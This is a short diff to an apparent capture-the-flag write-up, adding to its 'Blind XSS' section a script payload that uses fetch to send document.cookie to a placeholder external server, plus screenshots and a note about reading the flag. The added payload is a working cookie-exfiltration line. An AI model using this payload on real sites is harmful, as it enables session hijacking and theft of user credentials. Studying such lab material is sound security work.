@@ -36,6 +36,14 @@ Feedback page:
 
 ### Blind XSS
 
+    <script>fetch('https://your-server.com/log?cookie=' + document.cookie);</script>
+
+![image](https://github.com/user-attachments/assets/0f6f276e-62da-48bd-81fd-50208912489a)
+
+![image](https://github.com/user-attachments/assets/7c83df1a-70f9-4927-8f9c-289b3c8da2a8)
+
+Let's try to read flag!
+
 The exploitation consisted of fetching sensitive data from the local host via `fetch` and sending it to an external server via another `fetch` request.
 
 Payload:
